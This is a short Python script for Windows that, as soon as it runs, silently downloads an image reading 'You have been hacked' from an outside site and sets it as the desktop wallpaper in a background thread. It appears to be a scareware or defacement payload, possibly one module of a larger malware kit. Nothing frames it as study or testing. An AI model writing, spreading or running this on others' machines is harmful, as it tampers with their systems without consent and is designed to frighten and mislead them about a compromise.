import ctypes
import requests
import os
import threading

def download_and_set_wallpaper():
    url = "https://siccura.com/wp-content/uploads/2021/07/YOU-HAVE-BEEN-HACKED-BLOG-IMAGE-V2-1200x628-1.jpg"
    wallpaper_path = os.path.join(os.environ['TEMP'], "hacked.jpg")
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(wallpaper_path, 'wb') as file:
                for chunk in response.iter_content(1024):
                    file.write(chunk)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        else:
            print("Failed to download wallpaper.")
    except Exception as e:
        print(f"Error changing wallpaper: {e}")

def changewallpaper():
    threading.Thread(target=download_and_set_wallpaper, daemon=True).start()

changewallpaper()
